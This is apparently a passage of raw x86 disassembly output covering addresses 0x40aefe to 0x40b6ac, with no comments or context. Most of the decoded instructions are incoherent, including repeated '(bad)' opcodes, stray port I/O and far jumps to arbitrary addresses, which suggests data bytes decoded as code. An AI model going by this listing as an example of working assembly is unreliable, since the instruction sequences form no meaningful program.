  40aefe:	xchg   ebp,eax
  40aeff:	(bad)  
  40af00:	mov    ecx,0x9fc8903a
  40af05:	or     al,0x5
  40af07:	test   al,0x56
  40af09:	retf   
  40af0a:	sbb    DWORD PTR [ecx+esi*2+0x5a77486d],eax
  40af11:	fist   DWORD PTR [ebx+0x6c1a8319]
  40af17:	jb     0x40af12
  40af19:	mov    bl,0x95
  40af1b:	mov    bh,BYTE PTR [ebx]
  40af1d:	and    al,0x34
  40af1f:	push   esi
  40af20:	or     ch,ah
  40af22:	and    DWORD PTR [ecx],0xfbed46a7
  40af28:	sbb    eax,0xb46f454f
  40af2d:	dec    eax
  40af2e:	js     0x40aee4
  40af30:	mov    bh,0x38
  40af32:	mov    esp,0x5eef2817
  40af37:	inc    esp
  40af38:	int    0x7a
  40af3a:	arpl   WORD PTR cs:[eax],dx
  40af3d:	cwde   
  40af3e:	jmp    0xb2a985b9
  40af43:	mov    ds:0xc8874825,al
  40af48:	icebp  
  40af49:	mov    cl,BYTE PTR [esi-0x3d]
  40af4c:	sti    
  40af4d:	(bad)  
  40af4e:	repz jns 0x40afba
  40af51:	test   eax,0x4a058320
  40af56:	(bad)  
  40af57:	neg    DWORD PTR [ebx]
  40af59:	dec    eax
  40af5a:	add    eax,0xdff3889f
  40af5f:	dec    ebp
  40af60:	aaa    
  40af61:	push   edx
  40af62:	mov    al,ds:0x44a0803a
  40af67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af68:	xor    eax,0xc91ba1b2
  40af6d:	xor    eax,0xd2bd182e
  40af72:	ja     0x40af06
  40af74:	mov    cl,0x1c
  40af76:	out    dx,al
  40af77:	call   0xe0a9a8e6
  40af7c:	and    al,0xc8
  40af7e:	push   ss
  40af7f:	pop    esp
  40af80:	jbe    0x40afe2
  40af82:	and    edi,edi
  40af84:	push   ecx
  40af85:	outs   dx,DWORD PTR ds:[esi]
  40af86:	sub    DWORD PTR [eax+ebx*8],edx
  40af89:	cmp    BYTE PTR [edx+0xb],dh
  40af8c:	mov    ch,0xb6
  40af8e:	pop    es
  40af8f:	test   eax,0x468e9049
  40af94:	inc    ebp
  40af95:	jmp    0x29b85dd8
  40af9a:	mov    cl,0x76
  40af9c:	inc    edx
  40af9d:	inc    eax
  40af9e:	adc    DWORD PTR [edi+0x75],edx
  40afa1:	icebp  
  40afa2:	jle    0x40afee
  40afa4:	adc    DWORD PTR [eax+0x40d9451d],edi
  40afaa:	xor    DWORD PTR [edx+esi*4+0x2b],0x7f
  40afaf:	sar    DWORD PTR [eax+0x61a76832],cl
  40afb5:	push   0xffffffd2
  40afb7:	or     eax,0x39b0e9e
  40afbc:	in     al,dx
  40afbd:	pop    es
  40afbe:	cmovl  ecx,DWORD PTR [edx]
  40afc1:	mov    esi,0x4ede7162
  40afc6:	loop   0x40afb9
  40afc8:	add    eax,DWORD PTR [eax+0x60]
  40afcb:	out    0xb6,eax
  40afcd:	push   0xffffffa2
  40afcf:	jmp    0x40b02b
  40afd1:	add    al,0xb3
  40afd3:	dec    ecx
  40afd4:	icebp  
  40afd5:	push   0x45
  40afd7:	adc    eax,0xdf0106d9
  40afdc:	ins    BYTE PTR es:[edi],dx
  40afdd:	xor    al,0xbc
  40afdf:	retf   
  40afe0:	adc    esi,DWORD PTR [edi]
  40afe2:	xor    dh,bh
  40afe4:	push   0x5107d29f
  40afe9:	nop
  40afea:	outs   dx,BYTE PTR ds:[esi]
  40afeb:	sub    bl,ah
  40afed:	jb     0x40b006
  40afef:	add    eax,0x557b8f84
  40aff4:	sbb    al,0x1
  40aff6:	jecxz  0x40afad
  40aff8:	aam    0xbe
  40affa:	jne    0x40afe3
  40affc:	stos   DWORD PTR es:[edi],eax
  40affd:	xor    ecx,DWORD PTR [ebx-0x54ded782]
  40b003:	add    DWORD PTR [edx-0x64f2f3d1],esi
  40b009:	cmp    eax,DWORD PTR ds:0xaa0658fc
  40b00f:	push   ds
  40b010:	imul   edx,DWORD PTR [esi+0x63e8ba2e],0x25ce5c55
  40b01a:	or     DWORD PTR [edx+0x48],ebx
  40b01d:	shl    DWORD PTR [ecx],1
  40b01f:	cmp    edi,DWORD PTR [ecx-0x79]
  40b022:	xor    esi,esi
  40b024:	and    DWORD PTR [ecx+0xf47801c],eax
  40b02a:	shl    bl,cl
  40b02c:	xor    esi,esp
  40b02e:	enter  0x6f2b,0x1e
  40b032:	outs   dx,DWORD PTR ds:[esi]
  40b033:	jbe    0x40b028
  40b035:	and    esi,esp
  40b037:	rol    BYTE PTR [edx],1
  40b039:	xor    BYTE PTR [edi+eax*4],cl
  40b03c:	sbb    BYTE PTR [esi-0x61b06bed],cl
  40b042:	jmp    0x7030f9f9
  40b047:	inc    eax
  40b048:	shl    BYTE PTR ds:0xddef5678,0x21
  40b04f:	pop    ebp
  40b050:	mov    esp,0xa3993ea8
  40b055:	pop    eax
  40b056:	jbe    0x40b07e
  40b058:	int3   
  40b059:	outs   dx,BYTE PTR ds:[esi]
  40b05a:	ficom  DWORD PTR [ebp-0x40]
  40b05d:	sbb    esp,ecx
  40b05f:	es mov esp,0x453c0e99
  40b065:	push   edi
  40b066:	inc    edi
  40b067:	test   eax,0xb90c923f
  40b06c:	xchg   ecx,eax
  40b06d:	js     0x40b0c3
  40b06f:	icebp  
  40b070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b071:	xchg   DWORD PTR [ebx-0x5f],edi
  40b074:	lahf   
  40b075:	push   ebp
  40b076:	jl     0x40b005
  40b078:	jge    0x40b053
  40b07a:	ret    
  40b07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b07c:	and    al,0x2f
  40b07e:	(bad)  
  40b07f:	mov    edx,0x317a0496
  40b084:	xchg   edx,eax
  40b085:	shl    BYTE PTR [eax+0x21],cl
  40b088:	mov    cl,0x2f
  40b08a:	fs dec esi
  40b08c:	xor    esp,DWORD PTR [edi+0x387850a7]
  40b092:	or     DWORD PTR [ebp-0x2af295d9],0x4e
  40b099:	test   al,0x9f
  40b09b:	call   0x58f4:0x83edffa4
  40b0a2:	push   ds
  40b0a3:	(bad)  
  40b0a4:	(bad)  
  40b0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0a6:	mov    dh,0x12
  40b0a8:	pop    edi
  40b0a9:	mov    edx,ebp
  40b0ab:	xor    al,0x49
  40b0ad:	cmp    eax,0x1a344056
  40b0b2:	sub    esp,0xffffff9e
  40b0b5:	imul   esi,DWORD PTR [edi+edi*8],0xffffffa6
  40b0b9:	xor    edx,DWORD PTR [edx+0x1e]
  40b0bc:	int3   
  40b0bd:	cmp    eax,0xca712c8b
  40b0c2:	mov    eax,DWORD PTR [edi]
  40b0c4:	fwait
  40b0c5:	ret    0xa272
  40b0c8:	fmul   DWORD PTR ds:0x5af812bf
  40b0ce:	jg     0x40b0b5
  40b0d0:	imul   edx,DWORD PTR [ebx-0x2f],0x73
  40b0d4:	dec    edx
  40b0d5:	aad    0x34
  40b0d7:	mov    edx,0xd19f3d0f
  40b0dc:	daa    
  40b0dd:	out    dx,al
  40b0de:	out    0x15,al
  40b0e0:	jmp    0xad8:0x35432281
  40b0e7:	and    BYTE PTR [edx+0x4a578f24],al
  40b0ed:	push   edi
  40b0ee:	push   ds
  40b0ef:	call   0xc7693543
  40b0f4:	and    BYTE PTR [esi],dl
  40b0f6:	mov    ds:0xdddd0185,al
  40b0fb:	or     al,0x4f
  40b0fd:	jmp    0x357d:0xb6f8aad1
  40b104:	mov    ecx,0x49dc44be
  40b109:	in     eax,dx
  40b10a:	mov    al,0x69
  40b10c:	(bad)  
  40b10d:	enter  0x2154,0xc4
  40b111:	mov    dl,0x92
  40b113:	test   DWORD PTR [edi+0x520d52cd],ebp
  40b119:	mov    cl,0xee
  40b11b:	jp     0x40b0cf
  40b11d:	ret    0x5c12
  40b120:	leave  
  40b121:	xor    ecx,DWORD PTR [ebx]
  40b123:	cmp    eax,0x20bc38f7
  40b128:	sub    bh,BYTE PTR [edx+ebx*4]
  40b12b:	jmp    0xd842:0xe09a7392
  40b132:	cmp    al,0xc6
  40b134:	xor    DWORD PTR [ebp+0x4bf5116f],ecx
  40b13a:	jo     0x40b12d
  40b13c:	daa    
  40b13d:	adc    bh,BYTE PTR [ecx-0x3d]
  40b140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b141:	xchg   esp,eax
  40b142:	mov    bh,0x15
  40b144:	add    al,cl
  40b146:	jge    0x40b0e8
  40b148:	add    ebx,edx
  40b14a:	dec    edi
  40b14b:	mov    eax,0xa372e66f
  40b150:	mov    al,ds:0x23dbe7ba
  40b155:	std    
  40b156:	dec    edi
  40b157:	inc    edx
  40b158:	inc    esi
  40b159:	shr    edx,1
  40b15b:	jae    0x40b144
  40b15d:	adc    DWORD PTR [edi],ebx
  40b15f:	add    bl,al
  40b161:	sbb    DWORD PTR [esi+0x11],esp
  40b164:	imul   ebp,DWORD PTR [edi+0x46],0xfffffffa
  40b168:	adc    DWORD PTR [ecx],edi
  40b16a:	cmp    BYTE PTR [ebx+0x29],ch
  40b16d:	in     al,0x5b
  40b16f:	add    bh,dh
  40b171:	bound  ebx,QWORD PTR [esp+esi*8+0x6e]
  40b175:	out    dx,eax
  40b176:	xchg   esp,eax
  40b177:	push   esi
  40b178:	pop    edi
  40b179:	sub    al,BYTE PTR [eax]
  40b17b:	xchg   esp,eax
  40b17c:	rcl    BYTE PTR [esp+eax*8+0x9],cl
  40b180:	adc    al,0xd4
  40b182:	retf   
  40b183:	mov    al,0xde
  40b185:	dec    ebx
  40b186:	loopne 0x40b196
  40b188:	jnp    0x40b18a
  40b18a:	imul   eax,DWORD PTR [ecx+edi*1+0x38],0x4c2f42ca
  40b192:	sti    
  40b193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b194:	xchg   DWORD PTR [eax],esp
  40b196:	repz pop ebp
  40b198:	inc    esi
  40b199:	push   DWORD PTR [edi+esi*1-0x10]
  40b19d:	sbb    esp,DWORD PTR ds:0x2bd9a139
  40b1a3:	mov    WORD PTR [edx],ss
  40b1a5:	dec    eax
  40b1a6:	or     DWORD PTR [ecx+0x2eff9bf1],esp
  40b1ac:	mov    ch,0x8e
  40b1ae:	inc    eax
  40b1af:	xor    edx,DWORD PTR [ecx-0x5699c46d]
  40b1b5:	jne    0x40b1bf
  40b1b7:	lahf   
  40b1b8:	pop    edi
  40b1b9:	ret    
  40b1ba:	test   DWORD PTR [ebx+0x29],esi
  40b1bd:	rcr    DWORD PTR [ebx+0x5d910fc1],0xf
  40b1c4:	ficomp DWORD PTR [esi-0x13]
  40b1c7:	adc    eax,0xa6841430
  40b1cc:	jle    0x40b1ac
  40b1ce:	push   ss
  40b1cf:	xchg   esi,eax
  40b1d0:	mov    ah,BYTE PTR [ebp+0x35ccf504]
  40b1d6:	mul    DWORD PTR ss:[ebx-0x59]
  40b1da:	mov    ecx,DWORD PTR [edx-0x66]
  40b1dd:	test   DWORD PTR [esi],ebp
  40b1df:	pop    esi
  40b1e0:	pop    ebp
  40b1e1:	inc    eax
  40b1e2:	in     al,dx
  40b1e3:	lds    edi,FWORD PTR ds:0x6b3a3148
  40b1e9:	jno    0x40b1d4
  40b1eb:	mov    edi,0x68c70853
  40b1f0:	ins    BYTE PTR es:[edi],dx
  40b1f1:	jb     0x40b1a6
  40b1f3:	dec    esi
  40b1f4:	retf   0x9f63
  40b1f7:	call   FWORD PTR [ecx]
  40b1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1fa:	adc    ebp,esi
  40b1fc:	dec    ebx
  40b1fd:	ror    esi,1
  40b1ff:	mov    edi,0xe3d77c29
  40b204:	and    BYTE PTR [esi+0x4f],bh
  40b207:	jb     0x40b1e2
  40b209:	and    eax,ebx
  40b20b:	push   eax
  40b20c:	dec    esp
  40b20d:	test   al,0x6b
  40b20f:	add    BYTE PTR es:[ecx-0xc],dh
  40b213:	sti    
  40b214:	sahf   
  40b215:	ins    BYTE PTR es:[edi],dx
  40b216:	xchg   BYTE PTR [eax+edi*1-0x29],cl
  40b21a:	bound  ecx,QWORD PTR [ecx]
  40b21c:	inc    eax
  40b21d:	loopne 0x40b1ac
  40b21f:	mov    dh,0x74
  40b221:	call   0x1b94:0xeadb564f
  40b228:	cmp    al,0x1c
  40b22a:	test   al,0x58
  40b22c:	xor    al,0xe0
  40b22e:	ins    DWORD PTR es:[edi],dx
  40b22f:	jne    0x40b262
  40b231:	ret    
  40b232:	bound  esi,QWORD PTR [esi]
  40b234:	jle    0x40b22f
  40b236:	mov    cl,0x3f
  40b238:	push   esi
  40b239:	sti    
  40b23a:	mov    edi,0x9aef69c1
  40b23f:	inc    esp
  40b240:	mov    DWORD PTR [edx],edi
  40b242:	push   ds
  40b243:	sbb    eax,0xfccf1c4c
  40b248:	pop    es
  40b249:	jne    0x40b1ce
  40b24b:	sbb    eax,0xacb7373c
  40b250:	sub    al,0x96
  40b252:	xchg   esp,eax
  40b253:	or     DWORD PTR [ecx],eax
  40b255:	inc    esp
  40b256:	jae    0x40b252
  40b258:	adc    DWORD PTR [edi+0x64],ebx
  40b25b:	push   0x1c6f16f5
  40b260:	mov    DWORD PTR [ecx+0x13],ecx
  40b263:	jbe    0x40b273
  40b265:	dec    esp
  40b266:	pop    ecx
  40b267:	xchg   edi,eax
  40b268:	loop   0x40b2b2
  40b26a:	pushf  
  40b26b:	shr    edi,1
  40b26d:	aaa    
  40b26e:	jo     0x40b289
  40b270:	push   ss
  40b271:	jp     0x40b2c0
  40b273:	add    ah,al
  40b275:	hlt    
  40b276:	mov    bl,0x7b
  40b278:	mov    ch,BYTE PTR [ebp-0x2a]
  40b27b:	rcl    BYTE PTR [edi-0x6228e372],0xe5
  40b282:	jns    0x40b2f9
  40b284:	fwait
  40b285:	dec    ecx
  40b286:	adc    ch,BYTE PTR [esi]
  40b288:	xor    dh,BYTE PTR [esi-0x2b341793]
  40b28e:	mov    eax,ss:0xceac881e
  40b294:	mov    edx,DWORD PTR [edx+0x6f]
  40b297:	push   esp
  40b298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b299:	sub    dh,BYTE PTR [eax-0x4aa0d79a]
  40b29f:	aad    0xc9
  40b2a1:	push   0x5cd5f95d
  40b2a6:	and    DWORD PTR [ebx+ebx*1+0x27],eax
  40b2aa:	and    al,ch
  40b2ac:	icebp  
  40b2ad:	inc    ebp
  40b2ae:	(bad)  
  40b2af:	ss fwait
  40b2b1:	aad    0xb0
  40b2b3:	xchg   edi,eax
  40b2b4:	fst    QWORD PTR ds:0x9e4a56ed
  40b2ba:	mov    BYTE PTR [eax+0x45],cl
  40b2bd:	pop    edi
  40b2be:	pusha  
  40b2bf:	not    DWORD PTR [eax+0x3b]
  40b2c2:	daa    
  40b2c3:	mov    bl,0x2c
  40b2c5:	fs aad 0x9c
  40b2c8:	add    dl,0x29
  40b2cb:	std    
  40b2cc:	aas    
  40b2cd:	cmp    BYTE PTR [ebp-0x1f],bh
  40b2d0:	cwde   
  40b2d1:	cdq    
  40b2d2:	or     al,0xd6
  40b2d4:	and    eax,0xd28ff6b7
  40b2d9:	popa   
  40b2da:	mov    BYTE PTR [ecx-0x1d],cl
  40b2dd:	rcl    ebp,cl
  40b2df:	jnp    0x40b27f
  40b2e1:	test   eax,0xf7631726
  40b2e6:	test   BYTE PTR [ebx],0x98
  40b2e9:	jle    0x40b305
  40b2eb:	cmp    BYTE PTR fs:[edi+esi*4],al
  40b2ef:	jnp    0x40b271
  40b2f1:	jge    0x40b353
  40b2f3:	adc    al,0x37
  40b2f5:	inc    eax
  40b2f6:	or     eax,esi
  40b2f8:	push   cs
  40b2f9:	push   eax
  40b2fa:	push   ds
  40b2fb:	fstp   QWORD PTR [edx+0x64]
  40b2fe:	es adc al,0x79
  40b301:	je     0x40b2ab
  40b303:	(bad)  
  40b304:	aad    0xcb
  40b306:	xchg   BYTE PTR [edi*4-0x5b12ef2c],dl
  40b30d:	adc    BYTE PTR [eax],dl
  40b30f:	mov    ebp,0x875ba7bc
  40b314:	push   eax
  40b315:	sbb    BYTE PTR [ecx],0xdb
  40b318:	sub    al,0x58
  40b31a:	sub    al,0x63
  40b31c:	jp     0x40b2b3
  40b31e:	sub    eax,0x2570ede1
  40b323:	sbb    eax,0x1f11f78f
  40b328:	push   eax
  40b329:	pop    eax
  40b32a:	repnz ins BYTE PTR es:[edi],dx
  40b32c:	cmc    
  40b32d:	fisttp DWORD PTR [eax+0x4d]
  40b330:	mov    eax,0xbb7dfe7b
  40b335:	(bad)  
  40b336:	iret   
  40b337:	xor    eax,0xd6ac62bc
  40b33c:	push   ecx
  40b33d:	inc    esp
  40b33e:	popa   
  40b33f:	loope  0x40b375
  40b341:	pop    edi
  40b342:	sub    edi,DWORD PTR [ebp+0x7b]
  40b345:	jnp    0x40b3c3
  40b347:	adc    BYTE PTR [esi],bl
  40b349:	popa   
  40b34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b34b:	xor    al,0xa2
  40b34d:	mov    ebp,0x9e956a02
  40b352:	and    DWORD PTR [ecx-0x68749a50],ebx
  40b358:	in     al,0xb2
  40b35a:	and    DWORD PTR ds:0x222cc5c0,esp
  40b360:	loope  0x40b370
  40b362:	inc    ebp
  40b363:	push   ecx
  40b364:	sar    BYTE PTR [esi-0x4cce2bec],cl
  40b36a:	je     0x40b3bd
  40b36c:	loopne 0x40b34b
  40b36e:	add    ecx,DWORD PTR [edi-0x7218a21c]
  40b374:	push   ebx
  40b375:	out    0x1b,al
  40b377:	jge    0x40b3ad
  40b379:	std    
  40b37a:	jo     0x40b3a2
  40b37c:	nop
  40b37d:	or     eax,0xa28c6608
  40b382:	mov    dl,0xc
  40b384:	das    
  40b385:	fldenv [edx+0x564a76db]
  40b38b:	xchg   esi,eax
  40b38c:	js     0x40b3b0
  40b38e:	pusha  
  40b38f:	aaa    
  40b390:	repz and BYTE PTR [esi],dl
  40b393:	inc    ebx
  40b394:	or     BYTE PTR ds:0xcf542993,ah
  40b39a:	inc    ebx
  40b39b:	or     DWORD PTR cs:0xdea59a23,0x6c8fb152
  40b3a6:	fldcw  WORD PTR [esi]
  40b3a8:	adc    edi,DWORD PTR ds:0x8eb175f3
  40b3ae:	push   ds
  40b3af:	mov    al,0xcf
  40b3b1:	dec    eax
  40b3b2:	cmp    BYTE PTR [ebp+0x3b],ch
  40b3b5:	jae    0x40b412
  40b3b7:	pop    es
  40b3b8:	push   esp
  40b3b9:	adc    al,0xb9
  40b3bb:	pop    es
  40b3bc:	mov    WORD PTR [esp+edx*4],ss
  40b3bf:	or     DWORD PTR ds:0x14840367,esp
  40b3c5:	jge    0x40b430
  40b3c7:	inc    ebx
  40b3c8:	jecxz  0x40b3b8
  40b3ca:	inc    edi
  40b3cb:	or     al,0x3d
  40b3cd:	inc    edi
  40b3ce:	pop    ds
  40b3cf:	mov    edi,0x2193b09
  40b3d4:	lahf   
  40b3d5:	or     eax,0x4b752cf2
  40b3da:	xor    al,BYTE PTR [eax+0x32]
  40b3dd:	not    BYTE PTR [edx+0x1b]
  40b3e0:	push   ebp
  40b3e1:	jno    0x40b3d7
  40b3e3:	push   ebp
  40b3e4:	xor    BYTE PTR [edx-0x3d08c40e],dl
  40b3ea:	retf   0xf375
  40b3ed:	rol    BYTE PTR [ebp+0x16],1
  40b3f0:	jb     0x40b428
  40b3f2:	inc    esi
  40b3f3:	fidivr DWORD PTR [edi+0x1b]
  40b3f6:	mov    bl,0x22
  40b3f8:	sub    ch,dh
  40b3fa:	sbb    ch,BYTE PTR [ebx-0x4ab7963b]
  40b400:	aas    
  40b401:	or     al,0xb
  40b403:	inc    esi
  40b404:	adc    al,0xa8
  40b406:	mov    edx,0x698622c
  40b40b:	and    ebp,DWORD PTR [edi+0x6d]
  40b40e:	stos   BYTE PTR es:[edi],al
  40b40f:	neg    ch
  40b411:	daa    
  40b412:	in     eax,0x10
  40b414:	addr16 out dx,al
  40b416:	dec    edx
  40b417:	(bad)  
  40b419:	xlat   BYTE PTR ds:[ebx]
  40b41a:	sbb    eax,0x7d382a42
  40b41f:	cmp    bh,BYTE PTR [eax]
  40b421:	daa    
  40b422:	mov    al,0xdd
  40b424:	dec    ecx
  40b425:	xlat   BYTE PTR ds:[ebx]
  40b426:	popf   
  40b427:	fwait
  40b428:	xchg   ebp,eax
  40b429:	lds    ebp,FWORD PTR [esi+0x3b1b56f7]
  40b42f:	xchg   edx,eax
  40b430:	retf   0x9861
  40b433:	imul   eax,eax,0x81692a00
  40b439:	sub    BYTE PTR [ebx-0x4e8233f0],al
  40b43f:	outs   dx,DWORD PTR ds:[esi]
  40b440:	adc    eax,0x28760f81
  40b445:	push   ds
  40b446:	mov    dl,0xb7
  40b448:	out    0xb0,eax
  40b44a:	in     eax,dx
  40b44b:	push   esi
  40b44c:	mov    DWORD PTR [esi],ebp
  40b44e:	jne    0x40b4a6
  40b450:	fidiv  WORD PTR [esi-0x5ddbed16]
  40b456:	xor    BYTE PTR [eax+0x49db4a0d],ah
  40b45c:	sahf   
  40b45d:	mov    edi,0x9e772df
  40b462:	call   0xf43dae0d
  40b467:	(bad)  
  40b468:	jge    0x40b4ac
  40b46a:	xchg   esi,eax
  40b46b:	fdiv   st,st(0)
  40b46d:	xchg   ecx,eax
  40b46e:	pop    DWORD PTR [esi]
  40b470:	mov    edx,0xda6dae9b
  40b475:	xor    eax,0x83b3eba6
  40b47a:	xchg   BYTE PTR [edx-0x47],dl
  40b47d:	xchg   edi,eax
  40b47e:	push   ss
  40b47f:	inc    esi
  40b480:	lock jge 0x40b44b
  40b483:	in     eax,dx
  40b484:	jl     0x40b4cd
  40b486:	stos   DWORD PTR es:[edi],eax
  40b487:	sub    al,0x3
  40b489:	fisttp WORD PTR [eax+ebx*8]
  40b48c:	sbb    ax,0xbb46
  40b490:	test   DWORD PTR [ebp+0x586a87a3],edx
  40b496:	lea    esp,[eax-0x24]
  40b499:	loopne 0x40b4dd
  40b49b:	adc    esp,DWORD PTR [edi-0x51]
  40b49e:	enter  0x1767,0xb2
  40b4a2:	rol    DWORD PTR [edx-0x77],1
  40b4a5:	dec    esi
  40b4a6:	xchg   edi,eax
  40b4a7:	push   ebp
  40b4a8:	sub    DWORD PTR [esi],edx
  40b4aa:	mov    esi,0xbc5087de
  40b4af:	repz or ebx,esp
  40b4b2:	pop    eax
  40b4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4b4:	(bad)  
  40b4b5:	stos   BYTE PTR es:[edi],al
  40b4b6:	inc    ebx
  40b4b7:	in     eax,dx
  40b4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4b9:	retf   0x54d1
  40b4bc:	sub    BYTE PTR [eax+0x3b411c86],0xf6
  40b4c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4c4:	loop   0x40b4a5
  40b4c6:	mov    ebx,0x37fd797a
  40b4cb:	fs es xchg edi,eax
  40b4ce:	stc    
  40b4cf:	xchg   DWORD PTR [eax],eax
  40b4d1:	push   edi
  40b4d2:	sar    BYTE PTR [edx+eax*4+0x35c1a6b6],0x8f
  40b4da:	cld    
  40b4db:	shr    DWORD PTR [ebp-0x7f11704a],0xbf
  40b4e2:	jno    0x40b53a
  40b4e4:	and    ebx,0x61d4b788
  40b4ea:	or     ebp,DWORD PTR [edi]
  40b4ec:	(bad)  [ecx-0x4378f711]
  40b4f2:	lock mov ds:0x2e55162a,eax
  40b4f8:	adc    BYTE PTR [esp+ebx*4+0x30],ah
  40b4fc:	test   BYTE PTR [esi+0x5d4d5ad9],al
  40b502:	mov    bh,0x1b
  40b504:	xchg   esp,eax
  40b505:	mov    eax,ds:0x3c495753
  40b50a:	mov    fs,WORD PTR [eax-0x4e]
  40b50d:	or     DWORD PTR [edi+eiz*4],0x70
  40b511:	dec    edx
  40b512:	cld    
  40b513:	pop    es
  40b514:	(bad)  
  40b515:	shl    BYTE PTR [ecx+0x75],1
  40b518:	mov    ebx,0x43b8e0ce
  40b51d:	jg     0x40b4d1
  40b51f:	or     DWORD PTR [ebx+0xe],0xceb3b4a1
  40b526:	loop   0x40b514
  40b528:	adc    DWORD PTR [edi],edi
  40b52a:	ins    DWORD PTR es:[edi],dx
  40b52b:	test   BYTE PTR [edi+ecx*1-0x7abcbce7],0xed
  40b533:	or     DWORD PTR [eax+ecx*8-0x386087e0],0x36
  40b53b:	sbb    al,0xf9
  40b53d:	out    dx,eax
  40b53e:	or     BYTE PTR [ebx-0x7b],dh
  40b541:	scas   al,BYTE PTR es:[edi]
  40b542:	add    eax,0xb135044a
  40b548:	(bad)  
  40b549:	popa   
  40b54a:	jmp    0xfc67df7b
  40b54f:	fidiv  WORD PTR [edx-0x1508ae07]
  40b555:	push   esp
  40b556:	iret   
  40b557:	arpl   WORD PTR [esp+ebp*1-0x3],di
  40b55b:	fild   QWORD PTR [ebx-0x3da3564]
  40b561:	dec    edi
  40b562:	(bad)
  40b565:	push   es
  40b566:	not    esi
  40b568:	adc    eax,0x6345422a
  40b56d:	std    
  40b56e:	sub    ch,0x5c
  40b571:	ror    DWORD PTR [ebp-0x2f],cl
  40b574:	xchg   DWORD PTR [eax-0x4435b1b9],edx
  40b57a:	aas    
  40b57b:	inc    esp
  40b57c:	dec    ebx
  40b57d:	int3   
  40b57e:	push   ecx
  40b57f:	outs   dx,BYTE PTR ds:[esi]
  40b580:	xchg   DWORD PTR [ebx-0x536a7132],ebp
  40b586:	dec    esi
  40b588:	cli    
  40b589:	add    bh,ch
  40b58b:	sahf   
  40b58c:	sbb    BYTE PTR [esi+edx*8+0x69],bh
  40b590:	xor    BYTE PTR [edi+0x640570b6],cl
  40b596:	jbe    0x40b5b6
  40b598:	and    BYTE PTR [ecx+eax*1-0x1f],bl
  40b59c:	push   ebp
  40b59d:	pop    ss
  40b59e:	mov    esp,0x38149ad0
  40b5a3:	call   0x2a38:0x6b779587
  40b5aa:	daa    
  40b5ab:	jge    0x40b613
  40b5ad:	icebp  
  40b5ae:	not    DWORD PTR ds:[ebp+0x7c52eb4a]
  40b5b5:	cmp    BYTE PTR [ecx+0x5e],al
  40b5b8:	push   ebp
  40b5b9:	and    DWORD PTR [ebx-0x59],esp
  40b5bc:	or     DWORD PTR [eax],ebp
  40b5be:	adc    cl,dh
  40b5c0:	jne    0x40b5e6
  40b5c2:	mov    ch,0x24
  40b5c4:	inc    eax
  40b5c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5c6:	mov    bl,0x86
  40b5c8:	test   DWORD PTR [eax-0x45],0xd8e633a3
  40b5cf:	pusha  
  40b5d0:	xor    edi,edx
  40b5d2:	push   es
  40b5d3:	add    al,BYTE PTR [eax]
  40b5d5:	repz repnz ror edx,cl
  40b5d9:	std    
  40b5da:	in     eax,0x7
  40b5dc:	sahf   
  40b5dd:	sub    esp,edi
  40b5df:	stos   BYTE PTR es:[edi],al
  40b5e0:	es push 0x68
  40b5e3:	cmp    eax,0x245a03d4
  40b5e8:	addr16 mov bl,0x6c
  40b5eb:	das    
  40b5ec:	pusha  
  40b5ed:	std    
  40b5ee:	sar    DWORD PTR [ebp-0x1c3c2acb],0x17
  40b5f5:	es mov ebx,0x4e0cf73f
  40b5fb:	daa    
  40b5fc:	add    DWORD PTR [edx],edx
  40b5fe:	(bad)
  40b601:	(bad)  
  40b602:	sbb    eax,0x813a4cd8
  40b607:	lods   al,BYTE PTR ds:[esi]
  40b608:	in     eax,0x98
  40b60a:	sbb    al,0xe8
  40b60c:	(bad)  
  40b60d:	or     esi,DWORD PTR [ebx-0x367e1799]
  40b613:	pop    es
  40b614:	ficomp DWORD PTR [eax+0x4ea27a51]
  40b61a:	test   DWORD PTR [ebp-0x2b241f12],esi
  40b620:	mov    al,0xb1
  40b622:	push   ebp
  40b623:	pop    edx
  40b624:	add    eax,0x30d1ef4f
  40b629:	cwde   
  40b62a:	jmp    0x339d:0xa94d96df
  40b631:	xchg   edx,eax
  40b632:	sbb    ecx,DWORD PTR [edi-0x652c8be9]
  40b638:	jno    0x40b65e
  40b63a:	inc    ecx
  40b63b:	test   DWORD PTR [ecx+0x9780dc1],ebx
  40b641:	sub    DWORD PTR ds:0x66e88f61,edx
  40b647:	dec    al
  40b649:	adc    edx,DWORD PTR [ebx-0x2d]
  40b64c:	mov    ebp,0xeda40db9
  40b651:	jmp    0xe197:0x3d0fe237
  40b658:	push   edi
  40b659:	jns    0x40b692
  40b65b:	arpl   WORD PTR [eax-0x5a],si
  40b65e:	mov    eax,ds:0xd669e49
  40b663:	ins    DWORD PTR es:[edi],dx
  40b664:	jnp    0x40b5ef
  40b666:	call   0x646882c1
  40b66b:	dec    edx
  40b66c:	pop    edi
  40b66d:	(bad)  
  40b66e:	fwait
  40b66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b670:	and    DWORD PTR [edx+0x5d],eax
  40b673:	sahf   
  40b674:	cmp    BYTE PTR [eax+0x78defc98],bl
  40b67a:	ret    0x7af9
  40b67d:	mov    ch,0x1b
  40b67f:	push   0xa3df0542
  40b684:	dec    edi
  40b685:	add    DWORD PTR [edx+esi*1],ebp
  40b688:	pop    ss
  40b689:	xlat   BYTE PTR fs:[ebx]
  40b68b:	pop    ebx
  40b68c:	and    ah,BYTE PTR [edx+eiz*1+0x7a334864]
  40b693:	mov    ah,0x7e
  40b695:	aas    
  40b696:	sahf   
  40b697:	repz enter 0x176a,0x79
  40b69c:	enter  0xe9c6,0xfb
  40b6a0:	jmp    0x40b6af
  40b6a2:	(bad)
  40b6a5:	or     BYTE PTR [ebp-0x166714],dl
  40b6ab:	das    
  40b6ac:	loopne 0x40b6a6
